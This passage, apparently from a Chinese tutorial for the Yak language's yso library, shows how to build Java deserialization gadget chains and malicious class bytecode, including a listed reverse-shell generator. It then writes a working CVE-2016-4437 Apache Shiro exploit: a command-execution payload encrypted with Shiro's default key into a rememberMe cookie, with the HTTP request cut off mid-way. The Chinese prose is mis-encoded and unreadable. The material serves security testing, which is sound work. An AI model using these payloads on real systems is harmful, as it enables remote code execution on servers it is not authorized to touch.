heading">#</a></h3><p>ysoåº“æä¾›äº†<code>yso.GetJavaObjectFromBytes</code>å‡½æ•°ï¼Œå…¶å‚æ•°æ˜¯<code>[]byte</code>ç±»å‹ï¼Œå¯ä»¥å°†åºåˆ—åŒ–çš„æ•°æ®æµè½¬æ¢æˆJavaå¯¹è±¡ï¼Œè¿™ä½¿å¾—ç”¨æˆ·èƒ½å¤Ÿè®¿é—®å¹¶ä¿®æ”¹è¯¥å¯¹è±¡çš„å†…éƒ¨çŠ¶æ€ã€‚å®Œæˆä¿®æ”¹åï¼Œ<code>yso.ToBytes</code> å‡½æ•°å¯ä»¥è¢«ç”¨æ¥å°†è¿™ä¸ªå·²ç»ä¿®æ”¹çš„Javaå¯¹è±¡é‡æ–°åºåˆ—åŒ–æˆæ•°æ®æµï¼Œä»¥æ­¤å®ç°å¯¹åºåˆ—åŒ–æ•°æ®ä¿®æ”¹çš„æ•ˆæœã€‚</p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="ç”Ÿæˆåºåˆ—åŒ–å¯¹è±¡"></a>ç”Ÿæˆåºåˆ—åŒ–å¯¹è±¡<a class="hash-link" href="#ç”Ÿæˆåºåˆ—åŒ–å¯¹è±¡" title="Direct link to heading">#</a></h3><p>Javaååºåˆ—åŒ–æ¼æ´çš„å½¢æˆæºäºæ”»å‡»è€…ç²¾å¿ƒæ„é€ çš„æ¶æ„åºåˆ—åŒ–æ•°æ®æµï¼Œè¿™äº›æ•°æ®åœ¨ååºåˆ—åŒ–æ—¶èƒ½å¤Ÿæ“çºµæˆ–å½±å“è¯¥è¿‡ç¨‹ã€‚è¿™ç§æ¼æ´çš„å…¸å‹åˆ©ç”¨è·¯å¾„æ˜¯å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œæ”»å‡»è€…ç»å¸¸ä¼šåˆ›å»ºèƒ½å¤Ÿåœ¨ååºåˆ—åŒ–é˜¶æ®µé€šè¿‡åå°„è°ƒç”¨ä»»æ„æ–¹æ³•çš„ç±»ï¼Œå¸¸è§çš„æ”»å‡»æ–¹å¼åŒ…æ‹¬ä½¿ç”¨ <code>Runtime.exec</code> æ–¹æ³•æ‰§è¡Œå‘½ä»¤ã€‚ä¸ºäº†é€šè¿‡åå°„è°ƒç”¨<code>Runtime.exec</code>æ–¹æ³•ï¼Œå¸¸ç”¨çš„å‡ ä¸ªåºåˆ—åŒ–æ•°æ®æµè¢«æ€»ç»“ä¸ºå‡ æ¡å¸¸ç”¨gadgetï¼ŒYakå¯ä»¥ç›´æ¥æ„é€ å‡ºè¿™äº›åºåˆ—åŒ–æ•°æ®ã€‚ysoåº“æä¾›äº†å¦‚<code>yso.GetCommonsBeanutils183NOCCJavaObject</code>ã€<code>yso.GetCommonsCollections1JavaObject</code>çš„ç”Ÿæˆç±»å‡½æ•°ï¼Œå¯ä»¥æ ¹æ®éœ€æ±‚é€‰æ‹©gadgetç”Ÿæˆpayloadï¼Œå…¶å‚æ•°ä¸ºå¯é€‰å‚æ•°ï¼Œå¯ä»¥è®¾ç½®å†…éƒ¨æ¶æ„ç±»ã€å‘½ä»¤ç­‰ä¿¡æ¯ï¼Œè¿”å›å€¼ä¸º*yso.JavaObjectç±»å‹å’Œä¸€ä¸ªerrorä¿¡æ¯ã€‚</p><div class="codeBlockContainer_J+bg"><div class="codeBlockContent_csEI Go"><pre tabindex="0" class="prism-code language-Go codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">gadgetObj = yso.GetCommonsBeanutils183NOCCJavaObject(yso.useRuntimeExecEvilClass(&quot;whoami&quot;))~</span></span><span class="token-line" style="color:#393A34"><span class="token plain">gadgetBytes = yso.ToBytes(gadgetObj)~</span></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="è¾“å‡ºåºåˆ—åŒ–å¯¹è±¡"></a>è¾“å‡ºåºåˆ—åŒ–å¯¹è±¡<a class="hash-link" href="#è¾“å‡ºåºåˆ—åŒ–å¯¹è±¡" title="Direct link to heading">#</a></h3><p>ysoåº“æä¾›äº†yso.ToByteså‡½æ•°ï¼Œå…¶å‚æ•°ä¸º*yso.JavaObjectç±»å‹ï¼Œå¯ä»¥å°†åºåˆ—åŒ–å¯¹è±¡è¾“å‡ºä¸ºå­—èŠ‚æµï¼Œé™¤æ­¤ä¹‹å¤–è¿˜å¯ä»¥ä½¿ç”¨yso.ToJsonè¾“å‡ºä¸ºjsonã€‚</p><div class="codeBlockContainer_J+bg"><div class="codeBlockContent_csEI Go"><pre tabindex="0" class="prism-code language-Go codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">gadgetObj = yso.GetCommonsBeanutils183NOCCJavaObject(yso.useRuntimeExecEvilClass(&quot;whoami&quot;))~</span></span><span class="token-line" style="color:#393A34"><span class="token plain">gadgetBytes = yso.ToBytes(gadgetObj)~</span></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="yakç”Ÿæˆåˆ©ç”¨é“¾çš„åºåˆ—åŒ–å¯¹è±¡"></a>Yakç”Ÿæˆåˆ©ç”¨é“¾çš„åºåˆ—åŒ–å¯¹è±¡<a class="hash-link" href="#yakç”Ÿæˆåˆ©ç”¨é“¾çš„åºåˆ—åŒ–å¯¹è±¡" title="Direct link to heading">#</a></h3><table><thead><tr><th>åŠŸèƒ½åç§°</th><th>æè¿°</th></tr></thead><tbody><tr><td>GetJavaObjectFromBytes</td><td>ä»å­—èŠ‚è·å–Javaå¯¹è±¡</td></tr><tr><td>GetBeanShell1JavaObject</td><td>è·å–BeanShellåˆ©ç”¨é“¾çš„Javaå¯¹è±¡</td></tr><tr><td>GetClick1JavaObject</td><td>è·å–Clickæ¡†æ¶åˆ©ç”¨é“¾çš„Javaå¯¹è±¡</td></tr><tr><td>GetCommonsBeanutils1JavaObject</td><td>è·å–Commons Beanutilsåˆ©ç”¨é“¾çš„Javaå¯¹è±¡ï¼ˆå¤šä¸ªç‰ˆæœ¬ï¼‰</td></tr><tr><td>GetCommonsCollections1JavaObject</td><td>è·å–Apache Commons Collectionsåˆ©ç”¨é“¾çš„Javaå¯¹è±¡ï¼ˆå¤šä¸ªç‰ˆæœ¬ï¼‰</td></tr><tr><td>GetGroovy1JavaObject</td><td>è·å–Groovyåˆ©ç”¨é“¾çš„Javaå¯¹è±¡</td></tr><tr><td>GetJBossInterceptors1JavaObject</td><td>è·å–JBoss Interceptorsåˆ©ç”¨é“¾çš„Javaå¯¹è±¡</td></tr><tr><td>GetURLDNSJavaObject</td><td>è·å–åˆ©ç”¨DNSæŸ¥è¯¢çš„Javaå¯¹è±¡</td></tr><tr><td>GetFindGadgetByDNSJavaObject</td><td>é€šè¿‡DNSæŸ¥è¯¢å¯»æ‰¾Gadgetçš„Javaå¯¹è±¡</td></tr><tr><td>GetJSON1JavaObject</td><td>è·å–JSONç›¸å…³åˆ©ç”¨é“¾çš„Javaå¯¹è±¡</td></tr><tr><td>GetJavassistWeld1JavaObject</td><td>è·å–Javassist Weldåˆ©ç”¨é“¾çš„Javaå¯¹è±¡</td></tr><tr><td>GetJdk7u21JavaObject</td><td>è·å–é’ˆå¯¹JDK 7u21ç‰ˆæœ¬çš„åˆ©ç”¨é“¾Javaå¯¹è±¡</td></tr><tr><td>GetJdk8u20JavaObject</td><td>è·å–é’ˆå¯¹JDK 8u20ç‰ˆæœ¬çš„åˆ©ç”¨é“¾Javaå¯¹è±¡</td></tr><tr><td>GetAllGadget</td><td>è·å–æ‰€æœ‰å¯ç”¨çš„åˆ©ç”¨é“¾ï¼ˆGadgetï¼‰</td></tr><tr><td>GetAllTemplatesGadget</td><td>è·å–æ‰€æœ‰æ¨¡æ¿ç›¸å…³çš„åˆ©ç”¨é“¾</td></tr><tr><td>GetAllRuntimeExecGadget</td><td>è·å–æ‰€æœ‰æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„åˆ©ç”¨é“¾</td></tr><tr><td>GetGadgetNameByFun</td><td>é€šè¿‡å‡½æ•°è·å–åˆ©ç”¨é“¾åç§°</td></tr><tr><td>GetSimplePrincipalCollectionJavaObject</td><td>è·å–ç”¨äºShiroæ£€æŸ¥çš„Javaå¯¹è±¡</td></tr></tbody></table><p>ä»¥ä¸Šæ˜¯Yakç”Ÿæˆåˆ©ç”¨é“¾å¯¹è±¡çš„å¸¸è§APIï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨ <code>yso.Get...</code>çš„æ–¹æ³•ä½¿ç”¨è¿™äº› APIã€‚ç»“åˆæˆ‘ä»¬ä¸Šè¿°æ¡ˆä¾‹ï¼Œç”¨æˆ·å¯ä»¥å¾ˆå®¹æ˜“åœ¨ç¼–å†™ä»£ç çš„è¿‡ç¨‹ä¸­ï¼Œç”Ÿæˆåˆ©ç”¨é“¾å¯¹è±¡æµ‹è¯•Javaåº”ç”¨çš„å®‰å…¨æ€§ã€‚</p><h2><a aria-hidden="true" tabindex="-1" class="anchor anchor__h2 anchorWithStickyNavbar_y2LR" id="864-javaå­—èŠ‚ç è§£æ"></a>8.6.4 Javaå­—èŠ‚ç è§£æ<a class="hash-link" href="#864-javaå­—èŠ‚ç è§£æ" title="Direct link to heading">#</a></h2><p>åœ¨Javaä¸­ï¼Œæºä»£ç åœ¨æ‰§è¡Œä¹‹å‰å¿…é¡»å…ˆè¢«ç¼–è¯‘æˆå­—èŠ‚ç æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶ä»¥<code>.class</code>ä½œä¸ºæ–‡ä»¶åç¼€ã€‚è¿™äº›ç¼–è¯‘åçš„å­—èŠ‚ç æ–‡ä»¶éšåè¢«Javaè™šæ‹Ÿæœºï¼ˆJVMï¼‰åŠ è½½å’Œæ‰§è¡Œã€‚åœ¨ååºåˆ—åŒ–æ”»å‡»ä¸­ï¼ŒæŸäº›åˆ©ç”¨é“¾å…è®¸æ‰§è¡Œä»£ç ï¼Œè€Œè¿™äº›ä»£ç å¿…é¡»ä»¥Javaå­—èŠ‚ç çš„å½¢å¼å­˜åœ¨ã€‚å› æ­¤ï¼Œåœ¨æ„é€ æ¶æ„çš„åºåˆ—åŒ–æ•°æ®æµæ—¶ï¼Œéœ€è¦èƒ½å¤Ÿæ’å…¥æˆ–ä¿®æ”¹å­—èŠ‚ç ã€‚é€šè¿‡è§£æ<code>.class</code>æ–‡ä»¶çš„ç»“æ„ï¼ŒåŒ…æ‹¬å¸¸é‡æ± å’Œå­—èŠ‚ç æŒ‡ä»¤é›†ï¼Œå¯ä»¥æ ¹æ®å…¶æ”»å‡»ç›®çš„è¿›è¡Œç›¸åº”çš„ä¿®æ”¹ã€‚å®Œæˆè¿™äº›ä¿®æ”¹åï¼Œå†é‡æ–°ç”Ÿæˆ<code>.class</code>æ–‡ä»¶ï¼Œç”¨æ¥æ„é€ åºåˆ—åŒ–æ•°æ®æµã€‚</p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="å­—èŠ‚ç è§£æ"></a>å­—èŠ‚ç è§£æ<a class="hash-link" href="#å­—èŠ‚ç è§£æ" title="Direct link to heading">#</a></h3><p>åœ¨yaklangä¸­å¯ä»¥ä½¿ç”¨<code>yso.LoadClassFromBytes</code>å‡½æ•°è§£æ java å­—èŠ‚ç ï¼Œå¦‚ä¸‹ä»£ç å°†ä¼šè¯»å–/tmp/test.classæ–‡ä»¶ï¼Œå¹¶è§£æä¸ºç»“æ„åŒ–å¯¹è±¡</p><p>æ¡ˆä¾‹ä¸­çš„è¿”å›å€¼classInsä¸ºClassObjectç±»å‹</p><div class="codeBlockContainer_J+bg"><div class="codeBlockContent_csEI Go"><pre tabindex="0" class="prism-code language-Go codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">type ClassObject struct {</span></span><span class="token-line" style="color:#393A34"><span class="token plain">    Type                 string</span></span><span class="token-line" style="color:#393A34"><span class="token plain">    Magic                number</span></span><span class="token-line" style="color:#393A34"><span class="token plain">    MinorVersion         number</span></span><span class="token-line" style="color:#393A34"><span class="token plain">    MajorVersion         number</span></span><span class="token-line" style="color:#393A34"><span class="token plain">    ConstantPool         []javaclassparser.ConstantInfo</span></span><span class="token-line" style="color:#393A34"><span class="token plain">    AccessFlags          number</span></span><span class="token-line" style="color:#393A34"><span class="token plain">    AccessFlagsVerbose   []string</span></span><span class="token-line" style="color:#393A34"><span class="token plain">    ThisClass            number</span></span><span class="token-line" style="color:#393A34"><span class="token plain">    ThisClassVerbose     string</span></span><span class="token-line" style="color:#393A34"><span class="token plain">    SuperClass           number</span></span><span class="token-line" style="color:#393A34"><span class="token plain">    SuperClassVerbose    string</span></span><span class="token-line" style="color:#393A34"><span class="token plain">    Interfaces           []number</span></span><span class="token-line" style="color:#393A34"><span class="token plain">    InterfacesVerbose    []string</span></span><span class="token-line" style="color:#393A34"><span class="token plain">    Fields               []javaclassparser.MemberInfo</span></span><span class="token-line" style="color:#393A34"><span class="token plain">    Methods              []javaclassparser.MemberInfo</span></span><span class="token-line" style="color:#393A34"><span class="token plain">    Attributes           []javaclassparser.AttributeInfo</span></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span></span><span class="token-line" style="color:#393A34"><span class="token plain">func (ClassObject) Bcel() (string, error)</span></span><span class="token-line" style="color:#393A34"><span class="token plain">func (ClassObject) Bytes() []byte</span></span><span class="token-line" style="color:#393A34"><span class="token plain">func (ClassObject) Dump() (string, error)</span></span><span class="token-line" style="color:#393A34"><span class="token plain">func (ClassObject) FindConstStringFromPool(v string) *ConstantUtf8Info</span></span><span class="token-line" style="color:#393A34"><span class="token plain">func (ClassObject) FindFields() nil</span></span><span class="token-line" style="color:#393A34"><span class="token plain">func (ClassObject) FindMethods() nil</span></span><span class="token-line" style="color:#393A34"><span class="token plain">func (ClassObject) GetClassName() string</span></span><span class="token-line" style="color:#393A34"><span class="token plain">func (ClassObject) GetInterfacesName() []string</span></span><span class="token-line" style="color:#393A34"><span class="token plain">func (ClassObject) GetSupperClassName() string</span></span><span class="token-line" style="color:#393A34"><span class="token plain">func (ClassObject) Json() (string, error)</span></span><span class="token-line" style="color:#393A34"><span class="token plain">func (ClassObject) SetClassName(name string) error</span></span><span class="token-line" style="color:#393A34"><span class="token plain">func (ClassObject) SetMethodName(old string, name string) error</span></span><span class="token-line" style="color:#393A34"><span class="token plain">func (ClassObject) SetSourceFileName(name string) error</span></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="å­—èŠ‚ç ä¿®æ”¹"></a>å­—èŠ‚ç ä¿®æ”¹<a class="hash-link" href="#å­—èŠ‚ç ä¿®æ”¹" title="Direct link to heading">#</a></h3><p>é€šè¿‡å¯¹ç»“æ„ä½“å±æ€§çš„ä¿®æ”¹æˆ–é€šè¿‡ç»“æ„ä½“æ–¹æ³•å¯ä»¥é…ç½®ç±»ç»“æ„çš„ä¿¡æ¯ï¼Œå†è°ƒç”¨Byteæ–¹æ³•å¯ä»¥é‡æ–°ç”Ÿæˆå­—èŠ‚æ•°ç»„ï¼Œå®ç°å¯¹classæ–‡ä»¶çš„ä¿®æ”¹ï¼Œåœ¨ä¸Šé¢çš„æ¡ˆä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†/tmp/test.classæ–‡ä»¶è§£æä¸ºäº†ç»“æ„åŒ–å¯¹è±¡ã€‚ä¸‹é¢çš„æ¡ˆä¾‹å°†ä¼šä¿®æ”¹ç±»åã€javaç‰ˆæœ¬ï¼Œå¹¶ç”Ÿæˆæ–°classæ–‡ä»¶</p><div class="codeBlockContainer_J+bg"><div class="codeBlockContent_csEI Go"><pre tabindex="0" class="prism-code language-Go codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">classIns.SetClassName(&quot;newTest&quot;)</span></span><span class="token-line" style="color:#393A34"><span class="token plain">classIns.MajorVersion = 50</span></span><span class="token-line" style="color:#393A34"><span class="token plain">file.Save(&quot;/tmp/newTest.class&quot;, classIns.Bytes())</span></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="å­—èŠ‚ç ç”Ÿæˆ"></a>å­—èŠ‚ç ç”Ÿæˆ<a class="hash-link" href="#å­—èŠ‚ç ç”Ÿæˆ" title="Direct link to heading">#</a></h3><p>ä¸Šé¢çš„æ¡ˆä¾‹ä¸­å°†ä¿®æ”¹åçš„classå¯¹è±¡è¾“å‡ºä¸ºbytesç±»å‹ï¼Œé™¤æ­¤å¤–ï¼Œè¿˜å¯ä»¥è¾“å‡ºä¸ºbcel classï¼Œç”¨äºpayloadæ„é€ ï¼Œæˆ–jsonæ ¼å¼å­—èŠ‚ç ï¼Œå¯ä»¥ç”¨æ¥æŸ¥çœ‹classå†…éƒ¨ç»“æ„æˆ–å¯¹classä¿¡æ¯ä¿®æ”¹ã€‚ä¾‹å¦‚ï¼š</p><div class="codeBlockContainer_J+bg"><div class="codeBlockContent_csEI Go"><pre tabindex="0" class="prism-code language-Go codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">buildPayload(classIns.Bcel()) // æ„é€ payload</span></span><span class="token-line" style="color:#393A34"><span class="token plain">dump(classIns.Json()) // æŸ¥çœ‹classå†…éƒ¨ç»“æ„</span></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="ç”Ÿæˆåºåˆ—åŒ–æ•°æ®"></a>ç”Ÿæˆåºåˆ—åŒ–æ•°æ®<a class="hash-link" href="#ç”Ÿæˆåºåˆ—åŒ–æ•°æ®" title="Direct link to heading">#</a></h3><p>å¾—ç›Šäºjavaå­—èŠ‚ç ä¿®æ”¹çš„åŸºç¡€è®¾æ–½ï¼Œå¯ä»¥åœ¨æ„é€ åºåˆ—åŒ–payloadæ—¶å¯¹classè¿›è¡Œé…ç½®ï¼Œå¦‚ä¸‹æ˜¯ä½¿ç”¨Yakè„šæœ¬æ¥ç”ŸæˆCB1çš„payloadï¼Œå…¶ä¸­å¯¹classè®¾ç½®äº†ç‰ˆæœ¬ä¸º<code>52</code>ã€æ‰§è¡Œå‘½ä»¤ä¸º<code>whoami</code>ã€classåä¸º<code>djRiEemN</code></p><div class="codeBlockContainer_J+bg"><div class="codeBlockContent_csEI Go"><pre tabindex="0" class="prism-code language-Go codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">version = 52</span></span><span class="token-line" style="color:#393A34"><span class="token plain">command = &quot;whoami&quot;</span></span><span class="token-line" style="color:#393A34"><span class="token plain">className = &quot;djRiEemN&quot;</span></span><span class="token-line" style="color:#393A34"><span class="token plain">gadgetObj = yso.GetCommonsBeanutils1JavaObject(</span></span><span class="token-line" style="color:#393A34"><span class="token plain">  yso.useRuntimeExecEvilClass(command),</span></span><span class="token-line" style="color:#393A34"><span class="token plain">  yso.evilClassName(className),</span></span><span class="token-line" style="color:#393A34"><span class="token plain">  yso.majorVersion(version)</span></span><span class="token-line" style="color:#393A34"><span class="token plain">)~</span></span><span class="token-line" style="color:#393A34"><span class="token plain">gadgetBytes = yso.ToBytes(gadgetObj)~</span></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="yakç”Ÿæˆæ¶æ„å­—èŠ‚ç -api"></a>Yakç”Ÿæˆæ¶æ„å­—èŠ‚ç  API<a class="hash-link" href="#yakç”Ÿæˆæ¶æ„å­—èŠ‚ç -api" title="Direct link to heading">#</a></h3><p>å½“ç„¶ï¼Œé™¤äº†ä¸Šè¿°è¿™ä¸ªæ¡ˆä¾‹ä¹‹å¤–ï¼ŒYakè¯­è¨€è¿˜æ”¯æŒå•ç‹¬ç”Ÿæˆæ¶æ„ç±»å­—èŠ‚ç ï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨<code>yso.Generate...</code>ç›¸å…³çš„API æ¥ç”Ÿæˆæ¶æ„å­—èŠ‚ç ã€‚</p><table><thead><tr><th>åŠŸèƒ½åç§°</th><th>æè¿°</th></tr></thead><tbody><tr><td>GenerateClassObjectFromBytes</td><td>ä»å­—èŠ‚ç ç”Ÿæˆæ¶æ„ç±»å¯¹è±¡</td></tr><tr><td>GenerateRuntimeExecEvilClassObject</td><td>ç”Ÿæˆæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ¶æ„ç±»å¯¹è±¡</td></tr><tr><td>GenerateProcessBuilderExecEvilClassObject</td><td>é€šè¿‡ProcessBuilderæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ¶æ„ç±»å¯¹è±¡</td></tr><tr><td>GenerateProcessImplExecEvilClassObject</td><td>ç”Ÿæˆä½¿ç”¨ProcessImplæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ¶æ„ç±»å¯¹è±¡</td></tr><tr><td>GenerateDNSlogEvilClassObject</td><td>ç”Ÿæˆç”¨äºDNSè®°å½•çš„æ¶æ„ç±»å¯¹è±¡</td></tr><tr><td>GenerateSpringEchoEvilClassObject</td><td>ç”ŸæˆSpringæ¡†æ¶å›æ˜¾çš„æ¶æ„ç±»å¯¹è±¡</td></tr><tr><td>GenerateModifyTomcatMaxHeaderSizeEvilClassObject</td><td>ä¿®æ”¹Tomcatæœ€å¤§å¤´éƒ¨å¤§å°çš„æ¶æ„ç±»å¯¹è±¡</td></tr><tr><td>GenerateTcpReverseEvilClassObject</td><td>ç”ŸæˆTCPåå‘è¿æ¥çš„æ¶æ„ç±»å¯¹è±¡</td></tr><tr><td>GenerateTcpReverseShellEvilClassObject</td><td>ç”ŸæˆTCPåå‘Shellçš„æ¶æ„ç±»å¯¹è±¡</td></tr><tr><td>GenerateTomcatEchoClassObject</td><td>ç”ŸæˆTomcatå›æ˜¾çš„æ¶æ„ç±»å¯¹è±¡</td></tr><tr><td>GenerateMultiEchoClassObject</td><td>ç”Ÿæˆå¤šé‡å›æ˜¾çš„æ¶æ„ç±»å¯¹è±¡</td></tr><tr><td>GenerateHeaderEchoClassObject</td><td>ç”Ÿæˆå¤´éƒ¨å›æ˜¾çš„æ¶æ„ç±»å¯¹è±¡</td></tr><tr><td>GenerateSleepClassObject</td><td>ç”Ÿæˆä½¿ç›®æ ‡ä¼‘çœ çš„æ¶æ„ç±»å¯¹è±¡</td></tr></tbody></table><h2><a aria-hidden="true" tabindex="-1" class="anchor anchor__h2 anchorWithStickyNavbar_y2LR" id="865-æµ‹è¯•æ¡ˆä¾‹cve-2016-4437-shiro-ååºåˆ—åŒ–æ¼æ´"></a>8.6.5 æµ‹è¯•æ¡ˆä¾‹ï¼š<em>CVE</em>-<em>2016-4437 Shiro ååºåˆ—åŒ–æ¼æ´</em><a class="hash-link" href="#865-æµ‹è¯•æ¡ˆä¾‹cve-2016-4437-shiro-ååºåˆ—åŒ–æ¼æ´" title="Direct link to heading">#</a></h2><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="cve-2016-4437-shiro-ååºåˆ—åŒ–æ¼æ´"></a><em>CVE</em>-<em>2016-4437 Shiro ååºåˆ—åŒ–æ¼æ´</em><a class="hash-link" href="#cve-2016-4437-shiro-ååºåˆ—åŒ–æ¼æ´" title="Direct link to heading">#</a></h3><p>Apache Shiroåœ¨å¤„ç†ç”¨æˆ·ä¼šè¯æ—¶ä½¿ç”¨äº†Javaçš„åºåˆ—åŒ–æœºåˆ¶ã€‚ç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯è¢«åºåˆ—åŒ–åå­˜å‚¨åœ¨cookieä¸­ï¼Œè¿™ä¸ªcookieé€šå¸¸å«åš<code>rememberMe</code>ã€‚å½“ç”¨æˆ·ä¸‹æ¬¡è®¿é—®åº”ç”¨æ—¶ï¼Œåº”ç”¨ä¼šè§£æè¿™ä¸ªcookieï¼Œååºåˆ—åŒ–ä¼šè¯ä¿¡æ¯ï¼Œä»¥æ¢å¤ç”¨æˆ·çš„ä¼šè¯çŠ¶æ€ã€‚æ¼æ´äº§ç”Ÿçš„åŸå› æ˜¯Shiroåœ¨ååºåˆ—åŒ–<code>rememberMe</code> cookieæ—¶æ²¡æœ‰å……åˆ†æ£€æŸ¥è¾“å…¥æ•°æ®çš„æœ‰æ•ˆæ€§ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€æ¶æ„çš„åºåˆ—åŒ–å¯¹è±¡æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚å¦‚æœåº”ç”¨ç¨‹åºçš„ç±»è·¯å¾„ä¸­å­˜åœ¨å¯ä»¥è¢«è§¦å‘æ¶æ„è¡Œä¸ºçš„ç±»ï¼Œæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="ç¼–å†™åˆ©ç”¨è„šæœ¬"></a>ç¼–å†™åˆ©ç”¨è„šæœ¬<a class="hash-link" href="#ç¼–å†™åˆ©ç”¨è„šæœ¬" title="Direct link to heading">#</a></h3><p>å…ˆç”Ÿæˆä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„payloadï¼š</p><div class="codeBlockContainer_J+bg"><div class="codeBlockContent_csEI Go"><pre tabindex="0" class="prism-code language-Go codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">version = 52</span></span><span class="token-line" style="color:#393A34"><span class="token plain">command = &quot;whoami&quot;</span></span><span class="token-line" style="color:#393A34"><span class="token plain">className = &quot;guAVnGeu&quot;</span></span><span class="token-line" style="color:#393A34"><span class="token plain">log.setLevel(&quot;info&quot;)</span></span><span class="token-line" style="color:#393A34"><span class="token plain">gadgetObj = yso.GetCommonsBeanutils1JavaObject(</span></span><span class="token-line" style="color:#393A34"><span class="token plain">  yso.useProcessBuilderExecEvilClass(command),</span></span><span class="token-line" style="color:#393A34"><span class="token plain">  yso.obfuscationClassConstantPool(),</span></span><span class="token-line" style="color:#393A34"><span class="token plain">  yso.evilClassName(className),</span></span><span class="token-line" style="color:#393A34"><span class="token plain">  yso.majorVersion(version)</span></span><span class="token-line" style="color:#393A34"><span class="token plain">)~</span></span><span class="token-line" style="color:#393A34"><span class="token plain">gadgetBytes = yso.ToBytes(gadgetObj)~</span></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>Shiroçš„Cookieé»˜è®¤ä½¿ç”¨é»˜è®¤keyçš„cbcåŠ å¯†ï¼Œæ‰€ä»¥éœ€è¦å†å¯¹payloadåŠ å¯†ï¼Œå¾—åˆ°remberMeï¼š</p><div class="codeBlockContainer_J+bg"><div class="codeBlockContent_csEI Go"><pre tabindex="0" class="prism-code language-Go codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">base64Key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot; // base64ç¼–ç çš„key</span></span><span class="token-line" style="color:#393A34"><span class="token plain">key,_ = codec.DecodeBase64(base64Key) // ç”Ÿæˆkey</span></span><span class="token-line" style="color:#393A34"><span class="token plain">payload = codec.PKCS5Padding(gadgetBytes, 16) // åŠ å¯†payload</span></span><span class="token-line" style="color:#393A34"><span class="token plain">encodePayload = codec.AESCBCEncrypt(key, payload, nil)~</span></span><span class="token-line" style="color:#393A34"><span class="token plain">rememberMe = codec.EncodeBase64(append(key, encodePayload...))</span></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>æœ€åå°†payloadå‘é€è‡³ç›®æ ‡ï¼š</p><div class="codeBlockContainer_J+bg"><div class="codeBlockContent_csEI Go"><pre tabindex="0" class="prism-code language-Go codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">target = &quot;127.0.0.1:8080&quot;</span></span><span class="token-line" style="color:#393A34"><span class="token plain">rsp,req,_ = poc.HTTP(</span></span><span class="token-line" style="color:#393A34"><span class="token plain">  `GET /login HTTP/1.1</span></span><span class="token-line" style="color:#393A34"><span class="token plain">Host: {{params(target)}}</span></span><span class="token-line" style="color:#393A34"><span class="token plain">Cookie: 